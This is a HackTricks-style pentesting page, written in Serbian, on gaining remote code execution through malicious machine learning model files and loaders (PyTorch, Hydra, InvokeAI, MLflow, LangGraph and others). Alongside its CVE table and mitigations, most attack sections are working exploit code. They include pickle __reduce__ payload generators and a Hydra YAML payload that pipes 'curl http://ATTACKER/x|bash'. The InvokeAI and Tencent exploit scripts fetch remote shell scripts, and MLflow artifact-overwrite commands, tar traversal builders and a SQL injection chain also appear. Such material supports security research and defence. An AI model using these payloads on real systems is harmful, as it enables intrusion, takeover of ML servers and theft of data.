# Modeli RCE

{{#include ../banners/hacktricks-training.md}}

## Učitavanje modela radi RCE-a

Modeli mašinskog učenja obično se dele u različitim formatima, kao što su ONNX, TensorFlow, PyTorch itd. Programeri ih mogu učitavati na svojim mašinama ili u produkcionim sistemima. Modeli obično ne bi trebalo da sadrže zlonameran kod, ali u nekim slučajevima model može da se iskoristi za izvršavanje proizvoljnog koda na sistemu, bilo kao predviđena funkcionalnost ili zbog ranjivosti u biblioteci za učitavanje modela.

Sledeća tabela navodi reprezentativne ranjivosti iz ove kategorije:

| **Framework / alat**        | **Ranjivost (CVE ako je dostupan)**                                                    | **RCE vektor**                                                                                                                           | **Reference**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Nesigurna deserializacija u* `torch.load` **(CVE-2025-32434)**                                                              | Zlonameran pickle u kontrolnoj tački modela dovodi do izvršavanja koda (zaobilazeći zaštitu `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + preuzimanje zlonamernog modela dovodi do izvršavanja koda; RCE putem Java deserializacije u management API-ju                                        | |
| **NVIDIA Merlin Transformers4Rec** | Nesigurna deserializacija kontrolne tačke putem `torch.load` **(CVE-2025-23298)**                                           | Nepouzdana kontrolna tačka aktivira pickle reducer tokom `load_model_trainer_states_from_checkpoint` → izvršavanje koda u ML worker-u            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + nesiguran MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Ključ `filter` pod kontrolom korisnika ubacuje SQL/JSON-path sintaksu, `UNION SELECT` pravi lažni red kontrolne tačke, a zatim `msgpack` deserializacija uvozi i poziva Python kod koji je izabrao napadač | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (nesiguran YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Učitavanje modela iz YAML-a koristi `yaml.unsafe_load` (izvršavanje koda) <br> Učitavanje modela sa slojem **Lambda** pokreće proizvoljan Python kod          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsiranje)                                                                                          | Napravljeni `.tflite` model izaziva integer overflow → oštećenje heap-a (potencijalni RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Učitavanje modela putem `joblib.load` izvršava pickle sa `__reduce__` payloadom napadača                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (nesiguran `np.load`) *оспораван*                                                                              | Подразумевано, `numpy.load` дозвољава низове објеката pickle типа — злонамеран `.npy/.npz` доводи до извршавања кода                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Путања до спољних тежина ONNX модела може да изађе из директоријума (читање произвољних датотека) <br> Злонамерна ONNX model tar архива може да препише произвољне датотеке (што доводи до RCE-а) | |
| ONNX Runtime (дизајнерски ризик)  | *(Без CVE-а)* ONNX custom ops / control flow                                                                                    | Моделу са custom оператором је потребно учитати изворни код нападача; сложени графови модела злоупотребљавају логику ради извршавања ненамераваних израчунавања   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Коришћење model-load API-ја са омогућеним `--model-control` дозвољава релативни path traversal за уписивање датотека (нпр. преписивање `.bashrc` ради RCE-а)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (вишеструки heap overflow-и)                                                                         | Неисправан GGUF model фајл изазива heap buffer overflow-е у parser-у, што омогућава извршавање произвољног кода на систему жртве                     | |
| **Keras (старији формати)**   | *(Нема новог CVE-а)* Застарели Keras H5 модел                                                                                         | Злонамерни HDF5 (`.h5`) модел са слојем Lambda и даље извршава код при учитавању (Keras safe_mode не обухвата стари формат — „downgrade attack“) | |
| **Остало** (опште)        | *Недостатак у дизајну* – Pickle сериализација                                                                                         | Многи ML алати (нпр. формати модела засновани на pickle-у, Python `pickle.load`) извршавају произвољан код уграђен у фајлове модела ако се то не спречи | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Непоуздани metadata прослеђени функцији `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadata/config модела које контролише нападач поставља `_target_` на произвољни callable (нпр. `builtins.exec`) → извршава се током учитавања, чак и са „безбедним“ форматима (`.safetensors`, `.nemo`, репозиторијумски `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Поред тога, постоје модели засновани на Python pickle-у, попут оних које користи [PyTorch](https://github.com/pytorch/pytorch/security), помоћу којих се може извршити произвољан код на систему ако се не учитавају са `weights_only=True`. Зато сваки модел заснован на pickle-у може бити посебно подложан овој врсти напада, чак и ако није наведен у горњој табели.

### Hydra metadata → RCE (ради чак и са safetensors)

`hydra.utils.instantiate()` увози и позива било који тачкама раздвојени `_target_` у објекту конфигурације/metadata. Када библиотеке попут Hugging Face Transformers проследе **непоуздани metadata модела** функцији `instantiate()`, нападач може да наведе callable и аргументе који се одмах извршавају током учитавања модела (није потребан pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Пример payload-а (ради у `model_config.yaml` фајлу `.nemo` модела, репозиторијумском `config.json` фајлу или унутар `__metadata__` у `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Ključne tačke:
- Aktivira se pre inicijalizacije modela u NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders i FlexTok loaders.
- Hydra-ina string block-list može da se zaobiđe alternativnim putanjama za import (npr. `enum.bltns.eval`) ili imenima koja razrešava aplikacija (npr. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok takođe parsira stringifikovane metapodatke pomoću `ast.literal_eval`, što omogućava DoS (prekomerno trošenje CPU-a/memorije) pre poziva Hydra.

### 🆕 InvokeAI RCE preko `torch.load` (CVE-2024-12029)

`InvokeAI` je popularan web interfejs otvorenog koda za Stable-Diffusion. Verzije **5.3.1 – 5.4.2** izlažu REST endpoint `/api/v2/models/install`, koji korisnicima omogućava preuzimanje i učitavanje modela sa proizvoljnih URL-ova.<sup>[[1]](#references)</sup>

Interno, endpoint na kraju poziva:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Kada je dostavljena datoteka **PyTorch checkpoint (`*.ckpt`)**, `torch.load` obavlja **pickle deserializaciju**. Pošto sadržaj dolazi direktno sa URL-a pod kontrolom korisnika, napadač može da ugradi zlonamerni objekat sa prilagođenom metodom `__reduce__` u checkpoint; metoda se izvršava **tokom deserializacije**, što dovodi do **daljinskog izvršavanja koda (RCE)** na InvokeAI serveru.

Ranjivosti je dodeljen **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Vodič kroz eksploataciju

1. Napravite zlonamerni checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Hostujte `payload.ckpt` na HTTP serveru koji kontrolišete (npr. `http://ATTACKER/payload.ckpt`).
3. Aktivirajte ranjivu endpoint tačku (nije potrebna autentifikacija):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Kada InvokeAI preuzme datoteku, poziva `torch.load()` → gadget `os.system` se pokreće i napadač dobija izvršavanje koda u kontekstu procesa InvokeAI.

Gotov exploit: Metasploit modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo tok.<sup>[[3]](#references)</sup>

#### Uslovi

•  InvokeAI 5.3.1-5.4.2 (podrazumevana vrednost zastavice scan je **false**)
•  `/api/v2/models/install` je dostupan napadaču
•  Proces ima dozvole za izvršavanje shell komandi

#### Mere ublažavanja

* Nadogradite na **InvokeAI ≥ 5.4.3** – zakrpa podrazumevano postavlja `scan=True` i obavlja skeniranje na malware pre deserijalizacije.<sup>[[2]](#references)</sup>
* Pri programskom učitavanju checkpoint-ova koristite `torch.load(file, weights_only=True)` ili novi pomoćni alat [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Primenite liste dozvoljenih izvora / potpise za izvore modela i pokrenite servis sa najmanjim potrebnim privilegijama.

> ⚠️ Imajte na umu da je **svaki** format zasnovan na Python pickle-u (uključujući mnoge datoteke `.pt`, `.pkl`, `.ckpt`, `.pth`) po prirodi nebezbedan za deserijalizaciju iz nepouzdanih izvora.

---

Primer ad hoc mere ublažavanja ako morate da nastavite da koristite starije verzije InvokeAI iza reverse proxy-ja:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE preko nebezbednog `torch.load` (CVE-2025-23298)

NVIDIA Transformers4Rec (deo Merlin-a) izložio je nebezbedan učitavač checkpoint-a koji je direktno pozivao `torch.load()` nad putanjama koje je dostavio korisnik. Pošto se `torch.load` oslanja na Python `pickle`, checkpoint koji kontroliše napadač može da izvrši proizvoljan kod putem reducer-a tokom deserijalizacije.<sup>[[5]](#references)</sup>

Ranjiva putanja (pre ispravke): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Zašto ovo dovodi do RCE: U Python pickle-u, objekat može da definiše reducer (`__reduce__`/`__setstate__`) koji vraća callable i argumente. Callable se izvršava tokom unpickling-a. Ako je takav objekat prisutan u checkpoint-u, izvršava se pre nego što se upotrebe bilo kakve težine.

Minimalni primer zlonamernog checkpoint-a:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vektori isporuke i opseg uticaja:
- Trojanski checkpoint-i/modeli deljeni preko repozitorijuma, bucket-a ili registara artefakata
- Automatizovani pipeline-ovi za nastavak/implementaciju koji automatski učitavaju checkpoint-e
- Izvršavanje se odvija unutar radnika za treniranje/inferenciju, često sa povišenim privilegijama (npr. root u kontejnerima)

Ispravka: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zamenio je direktni `torch.load()` ograničenim deserijalizatorom sa allow-listom, implementiranim u `transformers4rec/utils/serialization.py`. Novi loader proverava tipove/polja i sprečava pozivanje proizvoljnih funkcija tokom učitavanja.<sup>[[7]](#references)</sup>

Preporuke za odbranu specifične za PyTorch checkpoint-e:
- Nemojte unpickle-ovati nepouzdane podatke. Kad god je moguće, dajte prednost formatima koji ne omogućavaju izvršavanje koda, kao što su [Safetensors](https://huggingface.co/docs/safetensors/index) ili ONNX.
- Ako morate da koristite PyTorch serialization, obezbedite da bude podešeno `weights_only=True` (podržano u novijim verzijama PyTorch-a) ili koristite prilagođeni unpickler sa allow-listom, sličan zakrpi za Transformers4Rec.<sup>[[4]](#references)</sup>
- Proveravajte poreklo/potpise modela i izvršavajte deserijalizaciju u sandbox-u (seccomp/AppArmor; korisnik koji nije root; ograničen FS i bez odlaznog mrežnog saobraćaja).
- Pratite neočekivane child procese koje pokreću ML servisi prilikom učitavanja checkpoint-a; pratite korišćenje `torch.load()`/`pickle`.

POC i reference za ranjivu verziju/zakrpu:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Ranjivi loader pre zakrpe: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC zlonamernog checkpoint-a: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader nakon zakrpe: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Primer – kreiranje zlonamernog PyTorch modela

- Kreirajte model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Učitaj model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserializacija Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent-ov FaceDetection-DSFD izlaže `resnet` endpoint koji deserijalizuje podatke pod kontrolom korisnika. ZDI je potvrdio da udaljeni napadač može da navede žrtvu da učita zlonamernu stranicu/datoteku, da ona pošalje posebno napravljen serijalizovani blob tom endpointu i pokrene deserijalizaciju kao `root`, što dovodi do potpunog kompromitovanja sistema.

Tok eksploatacije prati tipičnu zloupotrebu pickle-a:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Svaki gadget dostupan tokom deserijalizacije (konstruktori, `__setstate__`, callback-ovi framework-a itd.) može se iskoristiti na isti način, bez obzira na to da li je transport bio HTTP, WebSocket ili datoteka ubačena u nadgledani direktorijum.



### LangGraph checkpointer SQLi → MessagePack RCE

Ovaj lanac napada je zanimljiv zato što napadač **ne mora da otpremi zlonamernu datoteku modela**. Umesto toga, aplikacija izlaže **API za perzistenciju AI agenata** (`get_state_history(..., filter=...)`), a korisnički unos stiže do checkpointer query builder-a.

#### 1. Strukturni SQLi u filterima metapodataka

Ranjivi SQLite obrazac izgledao je ovako:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Vrednost se vezuje kasnije, ali se `query_key` konkatenira u **JSON path string**, pa `'` unutar ključa rečnika izlazi iz `'$.{query_key}'` i ubacuje SQL. Ista pouka važi za **JSON paths, identifikatore, operatore, `LIMIT` i TTL polja**: placeholderi štite samo vrednosti, a ne strukturnu sintaksu upita.

#### 2. `UNION SELECT` može da cilja nizvodne tačke obrade, a ne samo krađu podataka

Upit vraća `type` i serijalizovane `checkpoint` bajtove, koje kasnije koriste:

```python
self.serde.loads_typed((type, checkpoint))
```

To znači da SQLi u klauzuli `WHERE` može da ubaci **lažni red rezultata**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Ako kasniji kod parsira, deserijalizuje, upisuje ili izvršava neku izabranu kolonu, mapirajte te kolone do njihovih sink-ova. U ovom slučaju, lažni red pretvara SQLi u **deserijalizaciju pod kontrolom napadača**.

#### 3. Nebezbedni MessagePack extension hook-ovi ekvivalentni su code gadget-ima

LangGraph-ova `msgpack` putanja koristila je prilagođeni extension hook koji je raspakovao ugnježdeni tuple i izvršio:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Dakle, MessagePack extension objekat koji kodira nešto ekvivalentno `("os", "system", "id > /tmp/pwned")` uvozi `os`, pronalazi `system` i izvršava komandu. Pri pregledu AI framework-ova, proverite **custom MessagePack/JSON/pickle revivers** zbog dinamičkog uvoza, refleksije ili proizvoljnog pozivanja funkcija.

#### 4. Praktičan obrazac za audit agent framework-ova

Pregledajte svaki korisnički kontrolisan ulaz koji stiže do:
- API-ja za listanje istorije stanja / memorije / replay-a / checkpoint-a
- builder-a strukturiranih filtera koji generišu SQL ili delove Redis upita
- custom deserializatora (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- putanja za oporavak koje veruju redovima vraćenim iz persistence sloja

Ovaj konkretni lanac uticao je na self-hosted LangGraph deployment-e koji koriste **SQLite** ili **Redis** checkpointer-e kada su nepoverljivi korisnici mogli da kontrolišu `filter`. Zakrpljene verzije navedene u objavi bile su `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` i `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow PyFunc prepisivanje artifact-a do pickle RCE-a

MLflow PyFunc kreiran iz `PythonModel` može da sačuva serijalizovani objekat kao `python_model.pkl`. Metapodaci modela navode `mlflow.pyfunc.model` kao njegov loader, a MLflow implementacija koristi ovo ime datoteke za sačuvani Python model. Zato pristup upisivanju u artifact store može dovesti do izvršavanja koda u drugoj aplikaciji koja kasnije učita model.<sup>[[17]](#references)[[18]](#references)</sup>

Korisni lanac je **dozvola za upis u artifact → zamena pickle-a → ponovno učitavanje modela od strane inference potrošača**. Za eksperiment koji koristi proxied `mlflow-artifacts:/...` root, pronađite putanju do artifact-a eksperimenta, run-a i modela. Tracking server izlaže `GET` i `PUT` na `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Minimalni reducer može da izvrši komandu čim potrošač izvrši unpickle nad artefaktom. Generisanje payload-a pomoću Python verzije navedene u `MLmodel` izbegava probleme sa kompatibilnošću.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Pokrenite operaciju koja **učitava postojeći model**, kao što su predikcija, ocenjivanje ili deployment. Nemojte prvo ponovo trenirati model jer obuka može zameniti zlonamerni artefakt novim modelom. Greška aplikacije ne opovrgava eksploataciju: reducer vraća celobrojni izlazni status komande umesto upotrebljivog modela. Počnite sa uočljivim sporednim efektom, kao što su ICMP ili HTTP callback, a zatim ga zamenite završnim payload-om.<sup>[[20]](#references)</sup>

Tokom procene razlikujte dozvolu za kreiranje run-a od dozvole za prepisivanje artefakata koji pripadaju drugom run-u. Proverite autentifikaciju i dozvole za ažuriranje po run-u, pregledajte neočekivane izmene datoteke `python_model.pkl` i tretirajte poreklo i integritet modela kao deo granice izvršavanja. Aktuelni MLflow kod podržava i podešavanje opcije `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` i preporučuje artefakte models-from-code umesto učitavanja cloudpickle podataka.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

## Modeli do Path Traversal

Kao što je navedeno u [**ovoj objavi na blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), većina formata modela koje koriste različiti AI framework-i zasniva se na arhivama, obično `.zip` datotekama. Zato je moguće zloupotrebiti ove formate za napade Path Traversal, koji omogućavaju čitanje proizvoljnih datoteka sa sistema na kojem se model učitava.<sup>[[16]](#references)</sup>

Na primer, sledećim kodom možete napraviti model koji će kreirati datoteku u direktorijumu `/tmp` kada se učita:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ili, pomoću sledećeg koda možete kreirati model koji će pri učitavanju napraviti symlink ka direktorijumu `/tmp`:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Detaljni vodič: Keras .keras deserializacija i gadget hunting

Za fokusirani vodič kroz .keras interne detalje, RCE putem Lambda sloja, problem proizvoljnog uvoza u verzijama ≤ 3.8 i otkrivanje gadgeta unutar allowlist-e nakon ispravke, pogledajte:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – InvokeAI deserializacija nepouzdanih podataka"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI commit zakrpe 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentacija Rapid7 Metasploit modula](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – bezbednosna razmatranja za torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: Postizanje udaljenog izvršavanja koda u NVIDIA Merlin-u](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI savetodavno obaveštenje: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec commit zakrpe b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Ranjivi loader pre zakrpe (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC zlonamernog checkpoint-a (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader nakon zakrpe (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Udaljeno izvršavanje koda u modernim AI/ML formatima i bibliotekama](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra dokumentacija za instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra commit za blok-listu (upozorenje o RCE-u)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Od SQLi do RCE-a: iskorišćavanje LangGraph-ovog checkpointer-a](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Pretvaranje Archive Slip grešaka u vredne AI/ML bounty-je](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk savetodavno obaveštenje i PyFunc dokaz koncepta – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow izvorni kod – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – krajnje tačke za preuzimanje i otpremanje artefakata](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
